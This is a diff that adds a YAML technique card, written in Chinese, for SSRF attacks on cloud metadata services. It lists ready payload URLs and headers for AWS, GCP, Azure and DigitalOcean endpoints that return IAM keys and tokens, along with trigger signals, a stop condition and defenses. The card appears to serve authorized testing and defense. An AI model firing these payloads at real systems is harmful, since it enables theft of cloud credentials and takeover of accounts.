@@ -1,0 +1,68 @@
+# 技术卡片: SSRF - Cloud Metadata 窃取
+# 分类: ssrf / cloud
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: SecAtlas KB-SSRF-002 / HackTricks
+
+id: "ssrf-cloud-metadata"
+name: "SSRF → Cloud Metadata 凭证窃取"
+category: "ssrf"
+subcategory: "cloud-metadata"
+severity: "critical"
+
+description: |
+  目标部署在云环境，SSRF 可访问链路本地地址 169.254.169.254。
+  IMDSv1 无需认证头，直接读取 IAM 临时凭证、用户数据等敏感信息。
+
+trigger_signals:
+  - "应用接受 URL 参数向内部地址发起 HTTP 请求"
+  - "目标部署在 AWS EC2 / GCP / Azure"
+  - "向 169.254.169.254 发起请求有响应"
+  - "IMDSv1 默认开启（无 token 要求）"
+
+payloads:
+  aws_imdsv1:
+    - url: "http://169.254.169.254/latest/meta-data/"
+      note: "枚举可用元数据路径"
+    - url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      note: "列出 IAM 角色名"
+    - url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"
+      note: "获取 AccessKeyId + SecretAccessKey + Token"
+    - url: "http://169.254.169.254/latest/user-data/"
+      note: "用户数据可能含凭据/配置"
+  aws_imdsv2:
+    - note: "需 SSRF 支持 PUT 方法和自定义 HTTP 头"
+      step1: "PUT http://169.254.169.254/latest/api/token"
+      step2: "Header: X-aws-ec2-metadata-token-ttl-seconds: 21600"
+      step3: "GET 元数据 + Header: X-aws-ec2-metadata-token: <token>"
+  gcp:
+    - url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+      header: "Metadata-Flavor: Google"
+  azure:
+    - url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+      header: "Metadata: true"
+  digitalocean:
+    - url: "http://169.254.169.254/metadata/v1.json"
+
+success_indicators:
+  - "返回 AccessKeyId / SecretAccessKey / Token"
+  - "返回 IAM 角色名称"
+  - "返回实例 ID / 用户数据"
+
+prerequisites:
+  - "SSRF 漏洞存在且可达链路本地地址"
+  - "目标部署在云环境"
+  - "IMDSv1 未禁用或 SSRF 支持自定义头 (IMDSv2)"
+
+stop_conditions:
+  - "获得真实 IAM 凭证后立即停止，不做进一步利用"
+
+defense:
+  - "升级至 IMDSv2（强制 token）"
+  - "网络层阻止实例对 169.254.169.254 的非必要访问"
+  - "应用层禁止链路本地地址"
+
+sources:
+  - kb: "KB-SSRF-001 / KB-SSRF-002"
+  - ref: "HackTricks: AWS SSRF"
+  - ref: "CWE-918"
